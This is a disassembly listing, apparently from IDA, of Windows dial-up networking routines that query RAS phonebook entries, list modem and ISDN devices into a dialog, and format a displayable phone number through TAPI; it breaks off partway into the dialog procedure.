		push	esi
		mov	esi, ecx
		call	??1RNAAPI@@QAE@XZ ; RNAAPI::~RNAAPI(void)
		test	[ebp+arg_0], 1
		jz	short loc_1003B74
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_1003B74:				; CODE XREF: RNAAPI::`scalar deleting destructor'(uint)+11j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
??_GRNAAPI@@QAEPAXI@Z endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl MyRasGetEntryProperties(int, int,	int, int, int, void *)
?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	proc near
					; CODE XREF: FillModems(void)+32p
					; DialErrGetDisplayableNumber(void)+DCp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_C]
		push	ebx
		mov	ebx, [ebp+arg_14]
		push	esi
		xor	esi, esi
		push	edi
		mov	[eax], esi
		push	40h		; dwBytes
		mov	[ebx], esi
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, esi
		pop	ecx
		jz	short loc_1003BAC
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+arg_14], eax
		jmp	short loc_1003BAF
; ---------------------------------------------------------------------------

loc_1003BAC:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+1Ej
		mov	[ebp+arg_14], esi

loc_1003BAF:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+2Aj
		mov	ecx, [ebp+arg_14]
		mov	edi, [ebp+arg_8]
		cmp	ecx, esi
		mov	esi, [ebp+arg_10]
		jz	short loc_1003C01
		push	ebx
		push	0
		push	[ebp+arg_C]
		push	0
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	?RasGetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEPAK12@Z ; RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)
		cmp	eax, 25Bh
		mov	[ebp+arg_8], eax
		jnz	short loc_1003C08
		mov	eax, [ebp+arg_C]
		push	dword ptr [eax]	; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		test	eax, eax
		mov	[edi], eax
		jz	short loc_1003C01
		mov	eax, [ebx]
		test	eax, eax
		jbe	short loc_1003C42
		push	eax		; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		test	eax, eax
		mov	[esi], eax
		jnz	short loc_1003C48

loc_1003C01:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+3Aj
					; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+6Aj
		mov	[ebp+arg_8], 8

loc_1003C08:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+57j
		mov	eax, [edi]
		test	eax, eax
		mov	edi, ds:__imp__GlobalFree@4 ; GlobalFree(x)
		jz	short loc_1003C1A
		push	eax		; hMem
		call	edi ; GlobalFree(x) ; GlobalFree(x)
		and	dword ptr [esi], 0

loc_1003C1A:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+92j
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_1003C26
		push	eax		; hMem
		call	edi ; GlobalFree(x) ; GlobalFree(x)
		and	dword ptr [esi], 0

loc_1003C26:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+9Ej
		mov	ecx, [ebp+arg_14] ; void *
		test	ecx, ecx
		jz	short loc_1003C34
		push	1		; char
		call	??_GRNAAPI@@QAEPAXI@Z ;	RNAAPI::`scalar	deleting destructor'(uint)

loc_1003C34:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+ABj
		mov	eax, [ebp+arg_C]
		and	dword ptr [eax], 0
		and	dword ptr [ebx], 0
		mov	eax, [ebp+arg_8]
		jmp	short loc_1003C92
; ---------------------------------------------------------------------------

loc_1003C42:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+70j
		mov	esi, [ebp+arg_10]
		and	dword ptr [esi], 0

loc_1003C48:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+7Fj
		mov	eax, [edi]
		mov	dword ptr [eax], 0D8Ch
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_1003C5C
		mov	dword ptr [eax], 128h

loc_1003C5C:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+D4j
		mov	eax, [ebx]
		mov	ecx, [ebp+arg_14]
		push	ebx
		push	dword ptr [esi]
		mov	[ebp+arg_10], eax
		push	[ebp+arg_C]
		push	dword ptr [edi]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	?RasGetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEPAK12@Z ; RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)
		mov	esi, eax
		test	esi, esi
		jnz	short loc_1003C86
		mov	eax, [ebp+arg_10]
		cmp	eax, [ebx]
		jz	short loc_1003C86
		mov	[ebx], eax

loc_1003C86:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+FBj
					; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+102j
		mov	ecx, [ebp+arg_14] ; void *
		push	1		; char
		call	??_GRNAAPI@@QAEPAXI@Z ;	RNAAPI::`scalar	deleting destructor'(uint)
		mov	eax, esi

loc_1003C92:				; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+C0j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl FillModems()
?FillModems@@YAJXZ proc	near		; CODE XREF: DialErrDlgProc(x,x,x,x)+143p

var_2C		= dword	ptr -2Ch
wParam		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
dwBytes		= dword	ptr -18h
hMem		= dword	ptr -14h
lParam		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		push	ebx
		lea	eax, [ebp+var_20]
		push	eax		; void *
		lea	eax, [ebp+var_1C]
		push	eax		; int
		lea	eax, [ebp+var_24]
		push	eax		; int
		xor	ebx, ebx
		lea	eax, [ebp+hMem]
		push	eax		; int
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ebp+var_24], ebx
		mov	[ebp+var_20], ebx
		push	dword ptr [eax]	; int
		mov	[ebp+hMem], ebx
		push	ebx		; int
		mov	[ebp+var_1C], ebx
		mov	[ebp+var_C], ebx
		call	?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)
		add	esp, 18h
		cmp	eax, ebx
		mov	[ebp+var_4], eax
		jnz	loc_1003ED4
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		cmp	[eax+220h], ebx
		push	esi
		push	edi
		mov	edi, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		mov	esi, 128h
		jnz	short loc_1003D0C
		push	esi		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ecx+220h], eax

loc_1003D0C:				; CODE XREF: FillModems(void)+5Dj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		cmp	eax, ebx
		jz	short loc_1003D9A
		mov	[eax], esi
		push	40h		; dwBytes
		mov	[ebp+dwBytes], esi
		mov	[ebp+var_8], ebx
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, ebx
		pop	ecx
		jz	short loc_1003D3B
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+var_C], eax
		jmp	short loc_1003D3E
; ---------------------------------------------------------------------------

loc_1003D3B:				; CODE XREF: FillModems(void)+91j
		mov	[ebp+var_C], ebx

loc_1003D3E:				; CODE XREF: FillModems(void)+9Dj
		mov	ecx, [ebp+var_C]
		cmp	ecx, ebx
		jz	short loc_1003D9A
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+dwBytes]
		push	eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+220h]
		call	?RasEnumDevicesW@RNAAPI@@QAEKPAUtagRASDEVINFOW@@PAK1@Z ; RNAAPI::RasEnumDevicesW(tagRASDEVINFOW	*,ulong	*,ulong	*)
		cmp	eax, 25Bh
		mov	[ebp+var_4], eax
		jnz	short loc_1003DC6
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+220h] ; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		push	[ebp+dwBytes]	; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ecx+220h], eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		cmp	eax, ebx
		jnz	short loc_1003DA6

loc_1003D9A:				; CODE XREF: FillModems(void)+7Dj
					; FillModems(void)+A7j
		mov	[ebp+var_4], 8
		jmp	loc_1003ED2
; ---------------------------------------------------------------------------

loc_1003DA6:				; CODE XREF: FillModems(void)+FCj
		mov	ecx, [ebp+var_C]
		mov	[eax], esi
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+dwBytes]
		push	eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+220h]
		call	?RasEnumDevicesW@RNAAPI@@QAEKPAUtagRASDEVINFOW@@PAK1@Z ; RNAAPI::RasEnumDevicesW(tagRASDEVINFOW	*,ulong	*,ulong	*)
		mov	[ebp+var_4], eax

loc_1003DC6:				; CODE XREF: FillModems(void)+C9j
		cmp	[ebp+var_4], ebx
		jnz	loc_1003ED2
		mov	eax, [ebp+var_8]
		cmp	eax, ebx
		mov	esi, ds:__imp__SendDlgItemMessageW@20 ;	SendDlgItemMessageW(x,x,x,x,x)
		mov	[ebp+var_2C], eax
		mov	edi, 3FDh
		jz	loc_1003EBA
		mov	[ebp+lParam], ebx
		jbe	loc_1003EBA

loc_1003DF1:				; CODE XREF: FillModems(void)+216j
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		lea	eax, [eax+ebx+4]
		push	eax		; lpString2
		push	offset String1	; "MODEM"
		call	ds:__imp__lstrcmpiW@8 ;	lstrcmpiW(x,x)
		test	eax, eax
		jnz	loc_1003EA0
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		lea	eax, [eax+ebx+4]
		push	eax		; lpString2
		push	offset aIsdn	; "ISDN"
		call	ds:__imp__lstrcmpiW@8 ;	lstrcmpiW(x,x)
		test	eax, eax
		jnz	short loc_1003EA0
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	ecx, [eax+220h]
		lea	ecx, [ecx+ebx+26h]
		push	ecx		; lParam
		push	0		; wParam
		push	143h		; Msg
		push	edi		; nIDDlgItem
		push	dword ptr [eax+0Ch] ; hDlg
		call	esi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)
		push	[ebp+lParam]	; lParam
		mov	[ebp+wParam], eax
		push	eax		; wParam
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	151h		; Msg
		push	edi		; nIDDlgItem
		push	dword ptr [eax+0Ch] ; hDlg
		call	esi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)
		mov	eax, [ebp+hMem]
		add	eax, 786h
		push	eax		; lpString2
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		lea	eax, [eax+ebx+26h]
		push	eax		; lpString1
		call	ds:__imp__lstrcmpW@8 ; lstrcmpW(x,x)
		test	eax, eax
		jnz	short loc_1003EA3
		push	eax		; lParam
		push	[ebp+wParam]	; wParam
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	14Eh		; Msg
		push	edi		; nIDDlgItem
		push	dword ptr [eax+0Ch] ; hDlg
		call	esi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)
		jmp	short loc_1003EA3
; ---------------------------------------------------------------------------

loc_1003EA0:				; CODE XREF: FillModems(void)+172j
					; FillModems(void)+195j
		dec	[ebp+var_8]

loc_1003EA3:				; CODE XREF: FillModems(void)+1ECj
					; FillModems(void)+202j
		inc	[ebp+lParam]
		mov	eax, [ebp+lParam]
		add	ebx, 128h
		cmp	eax, [ebp+var_2C]
		jb	loc_1003DF1
		xor	ebx, ebx

loc_1003EBA:				; CODE XREF: FillModems(void)+146j
					; FillModems(void)+14Fj
		cmp	[ebp+var_8], 1
		jnz	short loc_1003ED2
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	ebx		; lParam
		push	ebx		; wParam
		push	14Eh		; Msg
		push	edi		; nIDDlgItem
		push	dword ptr [eax+0Ch] ; hDlg
		call	esi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)

loc_1003ED2:				; CODE XREF: FillModems(void)+105j
					; FillModems(void)+12Dj ...
		pop	edi
		pop	esi

loc_1003ED4:				; CODE XREF: FillModems(void)+3Fj
		cmp	[ebp+hMem], ebx
		jz	short loc_1003EE2
		push	[ebp+hMem]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1003EE2:				; CODE XREF: FillModems(void)+23Bj
		cmp	[ebp+var_1C], ebx
		jz	short loc_1003EF0
		push	[ebp+var_1C]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1003EF0:				; CODE XREF: FillModems(void)+249j
		mov	ecx, [ebp+var_C]
		cmp	ecx, ebx
		pop	ebx
		jz	short loc_1003EFF
		push	1		; char
		call	??_GRNAAPI@@QAEPAXI@Z ;	RNAAPI::`scalar	deleting destructor'(uint)

loc_1003EFF:				; CODE XREF: FillModems(void)+25Aj
		mov	eax, [ebp+var_4]
		leave
		retn
?FillModems@@YAJXZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl DialErrGetDisplayableNumber()
?DialErrGetDisplayableNumber@@YAJXZ proc near ;	CODE XREF: DialErrDlgProc(x,x,x,x)+B0p
					; DialErrDlgProc(x,x,x,x)+25Fp

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
hMem		= dword	ptr -14h
dwNumDevs	= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	esi
		xor	esi, esi
		lea	eax, [ebp+dwNumDevs]
		push	eax		; lpdwNumDevs
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	esi		; lpszAppName
		push	offset ?LineCallback@@YGXKKKKKK@Z ; lpfnCallback
		mov	[ebp+var_20], esi
		mov	[ebp+var_1C], esi
		mov	[ebp+dwNumDevs], esi
		push	dword ptr [eax+21Ch] ; hInstance
		add	eax, 10h
		push	eax		; lphLineApp
		mov	[ebp+var_8], esi
		mov	[ebp+var_C], esi
		call	_lineInitialize@20 ; lineInitialize(x,x,x,x,x)
		cmp	eax, esi
		mov	[ebp+var_4], eax
		jnz	loc_10041B8
		mov	eax, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_1003F58
		mov	[eax], esi

loc_1003F58:				; CODE XREF: DialErrGetDisplayableNumber(void)+4Bj
		push	edi
		mov	edi, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		push	10h		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		cmp	eax, esi
		mov	[ebp+hMem], eax
		jnz	short loc_1003F78
		mov	[ebp+var_4], 8
		jmp	loc_10041B7
; ---------------------------------------------------------------------------

loc_1003F78:				; CODE XREF: DialErrGetDisplayableNumber(void)+61j
		push	ebx
		mov	ebx, 10004h

loc_1003F7E:				; CODE XREF: DialErrGetDisplayableNumber(void)+AEj
		push	[ebp+hMem]	; lpExtensionID
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		lea	ecx, [eax+14h]
		push	ecx		; lpdwAPIVersion
		mov	ecx, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		push	ebx		; dwAPIHighVersion
		push	ebx		; dwAPILowVersion
		push	dword ptr [ecx]	; dwDeviceID
		push	dword ptr [eax+10h] ; hLineApp
		call	_lineNegotiateAPIVersion@24 ; lineNegotiateAPIVersion(x,x,x,x,x,x)
		test	eax, eax
		mov	[ebp+var_4], eax
		jz	short loc_1003FB9
		mov	eax, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		mov	ecx, [eax]
		mov	edx, [ebp+dwNumDevs]
		mov	[ebp+var_18], ecx
		dec	edx
		inc	ecx
		cmp	[ebp+var_18], edx
		mov	[eax], ecx
		jb	short loc_1003F7E

loc_1003FB9:				; CODE XREF: DialErrGetDisplayableNumber(void)+98j
		push	[ebp+hMem]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		cmp	[ebp+var_4], 0
		jnz	loc_10041B6
		lea	eax, [ebp+var_1C]
		push	eax		; void *
		lea	eax, [ebp+var_C]
		push	eax		; int
		lea	eax, [ebp+var_20]
		push	eax		; int
		lea	eax, [ebp+var_8]
		push	eax		; int
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax]	; int
		push	0		; int
		call	?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)
		add	esp, 18h
		test	eax, eax
		mov	[ebp+var_4], eax
		jnz	loc_100418D
		mov	ebx, [ebp+var_8]
		test	byte ptr [ebx+4], 1
		jnz	short loc_100406D
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+218h]
		test	eax, eax
		jz	short loc_1004017
		push	eax		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1004017:				; CODE XREF: DialErrGetDisplayableNumber(void)+105j
		add	ebx, 26h
		push	ebx		; lpString
		call	ds:__imp__lstrlenW@4 ; lstrlenW(x)
		inc	eax
		push	eax		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ecx+218h], eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		cmp	dword ptr [eax+218h], 0
		jnz	short loc_100404D

loc_1004041:				; CODE XREF: DialErrGetDisplayableNumber(void)+1B8j
					; DialErrGetDisplayableNumber(void)+1FAj ...
		mov	[ebp+var_4], 8
		jmp	loc_100418D
; ---------------------------------------------------------------------------

loc_100404D:				; CODE XREF: DialErrGetDisplayableNumber(void)+136j
		mov	edi, ds:__imp__lstrcpyW@8 ; lstrcpyW(x,x)
		push	ebx		; lpString2
		add	eax, 18h
		push	eax		; lpString1
		call	edi ; lstrcpyW(x,x) ; lstrcpyW(x,x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	ebx		; lpString2
		push	dword ptr [eax+218h] ; lpString1
		call	edi ; lstrcpyW(x,x) ; lstrcpyW(x,x)
		jmp	loc_100418D
; ---------------------------------------------------------------------------

loc_100406D:				; CODE XREF: DialErrGetDisplayableNumber(void)+F6j
		lea	eax, [ebx+10h]
		cmp	word ptr [eax],	0
		jz	short loc_1004097
		lea	ecx, [ebx+26h]
		push	ecx
		push	eax
		push	dword ptr [ebx+0Ch]
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		add	eax, 18h
		push	offset aLuSS	; "+%lu	(%s) %s"
		push	eax		; LPWSTR
		call	ds:__imp__wsprintfW
		add	esp, 14h
		jmp	short loc_10040B5
; ---------------------------------------------------------------------------

loc_1004097:				; CODE XREF: DialErrGetDisplayableNumber(void)+16Bj
		lea	eax, [ebx+26h]
		push	eax
		push	dword ptr [ebx+0Ch]
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		add	eax, 18h
		push	offset aLuS	; "+%lu	%s"
		push	eax		; LPWSTR
		call	ds:__imp__wsprintfW
		add	esp, 10h

loc_10040B5:				; CODE XREF: DialErrGetDisplayableNumber(void)+18Cj
		push	28h
		pop	ebx
		push	ebx		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	esi, eax
		test	esi, esi
		jz	loc_1004041
		push	esi		; lpTranslateOutput
		mov	[esi], ebx
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	2		; dwTranslateOptions
		push	0		; dwCard
		lea	ecx, [eax+18h]
		push	ecx		; lpszAddressIn
		push	dword ptr [eax+14h] ; dwAPIVersion
		mov	ecx, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		push	dword ptr [ecx]	; dwDeviceID
		push	dword ptr [eax+10h] ; hLineApp
		call	_lineTranslateAddressW@28 ; lineTranslateAddressW(x,x,x,x,x,x,x)
		test	eax, eax
		mov	[ebp+var_4], eax
		jnz	short loc_10040F8
		mov	eax, [esi+4]
		cmp	eax, [esi]
		jz	short loc_100413F

loc_10040F8:				; CODE XREF: DialErrGetDisplayableNumber(void)+1E6j
		push	dword ptr [esi+4] ; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_1004041
		mov	eax, [esi+4]
		push	esi		; hMem
		mov	[ebx], eax
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	ebx		; lpTranslateOutput
		push	2		; dwTranslateOptions
		push	0		; dwCard
		lea	ecx, [eax+18h]
		push	ecx		; lpszAddressIn
		push	dword ptr [eax+14h] ; dwAPIVersion
		mov	ecx, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		push	dword ptr [ecx]	; dwDeviceID
		mov	esi, ebx
		push	dword ptr [eax+10h] ; hLineApp
		call	_lineTranslateAddressW@28 ; lineTranslateAddressW(x,x,x,x,x,x,x)
		test	eax, eax
		mov	[ebp+var_4], eax
		jnz	short loc_100418D

loc_100413F:				; CODE XREF: DialErrGetDisplayableNumber(void)+1EDj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+218h]
		test	eax, eax
		jz	short loc_1004155
		push	eax		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1004155:				; CODE XREF: DialErrGetDisplayableNumber(void)+243j
		mov	eax, [esi+14h]
		inc	eax
		push	eax		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ecx+218h], eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+218h]
		test	eax, eax
		jz	loc_1004041
		push	dword ptr [esi+14h] ; iMaxLength
		mov	ecx, [esi+18h]
		add	ecx, esi
		push	ecx		; lpString2
		push	eax		; lpString1
		call	ds:__imp__lstrcpynW@12 ; lstrcpynW(x,x,x)

loc_100418D:				; CODE XREF: DialErrGetDisplayableNumber(void)+E9j
					; DialErrGetDisplayableNumber(void)+13Fj ...
		cmp	[ebp+var_8], 0
		jz	short loc_100419C
		push	[ebp+var_8]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_100419C:				; CODE XREF: DialErrGetDisplayableNumber(void)+288j
		cmp	[ebp+var_C], 0
		jz	short loc_10041AB
		push	[ebp+var_C]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_10041AB:				; CODE XREF: DialErrGetDisplayableNumber(void)+297j
		test	esi, esi
		jz	short loc_10041B6
		push	esi		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_10041B6:				; CODE XREF: DialErrGetDisplayableNumber(void)+BDj
					; DialErrGetDisplayableNumber(void)+2A4j
		pop	ebx

loc_10041B7:				; CODE XREF: DialErrGetDisplayableNumber(void)+6Aj
		pop	edi

loc_10041B8:				; CODE XREF: DialErrGetDisplayableNumber(void)+3Dj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+10h]
		test	eax, eax
		pop	esi
		jz	short loc_10041CB
		push	eax		; hLineApp
		call	_lineShutdown@4	; lineShutdown(x)

loc_10041CB:				; CODE XREF: DialErrGetDisplayableNumber(void)+2BAj
		mov	eax, [ebp+var_4]
		leave
		retn
?DialErrGetDisplayableNumber@@YAJXZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall DialErrDlgProc(HWND, UINT, WPARAM, LPARAM)
_DialErrDlgProc@16 proc	near		; DATA XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+97o

dwNumDevs	= dword	ptr -12Ch
hWnd		= dword	ptr -128h
var_124		= dword	ptr -124h
var_120		= dword	ptr -120h
var_11C		= dword	ptr -11Ch
var_118		= dword	ptr -118h
lpString2	= dword	ptr -114h
var_110		= dword	ptr -110h
hMem		= dword	ptr -10Ch
String1		= word ptr -108h
var_4		= dword	ptr -4
hDlg		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 12Ch
		mov	eax, ___security_cookie
		push	ebx
		mov	ebx, [ebp+hDlg]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_4]
		push	esi
		xor	esi, esi
		dec	eax
		dec	eax
		push	edi
		mov	[ebp+hWnd], ebx
		mov	[ebp+var_120], 1
		mov	[ebp+var_118], esi
		mov	[ebp+hMem], esi
		mov	[ebp+lpString2], esi
		mov	[ebp+var_110], esi
		jz	loc_10048FB
		sub	eax, 0Eh
		jz	loc_10048ED
		sub	eax, 43h
		mov	edi, ds:__imp__WinHelpW@16 ; WinHelpW(x,x,x,x)
